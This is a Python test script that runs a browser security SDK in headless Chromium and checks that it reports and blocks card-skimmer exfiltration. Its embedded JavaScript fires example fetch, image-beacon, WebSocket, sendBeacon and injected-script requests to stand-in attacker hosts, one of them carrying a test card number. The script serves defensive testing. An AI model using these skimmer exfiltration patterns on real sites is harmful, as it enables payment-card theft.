#!/usr/bin/env python3
"""
Skimmer / Magecart kill-chain proof for the Nemesis Shield BROWSER SDK.

Runs the ACTUAL SDK in a real (headless Chromium) browser against a console this
script controls, and asserts - channel by channel - that every card-skimmer
exfiltration / code-load gate is:
  * DETECTED + reported to the console in observe mode, and
  * BLOCKED in enforce mode.

Channels: fetch, XMLHttpRequest? (n/a here), image-beacon, WebSocket, sendBeacon,
and Magecart <script> injection.

Run:  pip install playwright && playwright install chromium && python skimmer_killchain.py
Exit code 0 = all channels pass.
"""
import threading, http.server, socketserver, time, json, os, sys
from playwright.sync_api import sync_playwright

SDK = open(os.path.join(os.path.dirname(__file__), "..", "nemesis-shield.js")).read()
PAGE = ('<!doctype html><meta charset=utf-8>'
        '<script src="/nemesis-shield.js"></script>'
        '<script>window.__ns=NemesisShield.init({token:"demo",endpoint:"/collect"});window.__ready=1;</script>')
state = {"mode": "observe", "reports": []}

class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def _s(self, c, b, t="text/html"):
        bb = b.encode(); self.send_response(c)
        self.send_header("content-type", t); self.send_header("content-length", str(len(bb)))
        self.end_headers(); self.wfile.write(bb)
    def do_GET(self):
        self._s(200, SDK, "application/javascript") if self.path == "/nemesis-shield.js" else self._s(200, PAGE)
    def do_POST(self):
        n = int(self.headers.get("content-length", 0)); raw = self.rfile.read(n).decode()
        try:
            for sk in json.loads(raw).get("sketches", []):
                state["reports"].append((sk.get("route", ""), sk.get("status")))
        except Exception: pass
        enf = state["mode"] == "enforce"
        self._s(200, json.dumps({"mode": state["mode"],
                "policy": {"shapes": {"seed": "allow"} if enf else {}, "knownBad": []}}), "application/json")

# fire every channel; report in-page block signals (script uses isConnected, not src)
ATTACKS = r"""async () => {
  const R = {};
  try { await fetch("https://exfil-c2.ru/steal",{mode:"no-cors"}); R.fetch="allowed"; }
  catch(e){ R.fetch = (""+e.message).includes("blocked")?"blocked":"allowed"; }
  try { const im=new Image(); im.src="https://evil-skimmer.ru/x?cc=4111111111111111"; R.image = im.src?"allowed":"blocked"; } catch(e){ R.image="blocked"; }
  try { new WebSocket("wss://exfil-c2.ru/ws"); R.websocket="allowed"; } catch(e){ R.websocket=(""+e.message).includes("blocked")?"blocked":"allowed"; }
  try { R.beacon = navigator.sendBeacon("https://beacon-evil.ru/b","cc")?"allowed":"blocked"; } catch(e){ R.beacon="blocked"; }
  const s=document.createElement("script"); s.src="https://evil-cdn.ru/skimmer.js"; document.head.appendChild(s);
  await new Promise(r=>setTimeout(r,200));
  R.script = s.isConnected ? "allowed" : "blocked";   // removed from DOM => cannot execute
  return R;
}"""
CHANNELS = [("fetch","exfil-c2.ru"),("image","evil-skimmer.ru"),("websocket","exfil-c2.ru"),("beacon","beacon-evil.ru"),("script","evil-cdn.ru")]

def main():
    srv = socketserver.TCPServer(("127.0.0.1", 8971), H); srv.allow_reuse_address = True
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    ok = True
    with sync_playwright() as p:
        b = p.chromium.launch(headless=True); pg = b.new_page()
        pg.goto("http://127.0.0.1:8971/", wait_until="load", timeout=20000)
        for _ in range(20):
            if pg.evaluate("()=>window.__ready"): break
            time.sleep(0.3)

        print("== OBSERVE: detect + report ==")
        obs = pg.evaluate(ATTACKS); time.sleep(6)
        rec = set(r for (r, s) in state["reports"])
        for ch, host in CHANNELS:
            seen = any(host in r for r in rec)
            good = obs.get(ch) == "allowed" and seen
            ok = ok and good
            print(f"  {ch:10} reported={'yes' if seen else 'NO ':3}  {'PASS' if good else 'FAIL'}")

        print("== ENFORCE: block ==")
        state["mode"] = "enforce"; time.sleep(7); state["reports"].clear()
        enf = pg.evaluate(ATTACKS)
        for ch, _ in CHANNELS:
            good = enf.get(ch) == "blocked"
            ok = ok and good
            print(f"  {ch:10} {'BLOCKED PASS' if good else 'LEAKED  FAIL'}")
        b.close()
    srv.shutdown()
    print("\nRESULT:", "ALL CHANNELS PASS ✓" if ok else "FAILURES ✗")
    sys.exit(0 if ok else 1)

if __name__ == "__main__":
    main()
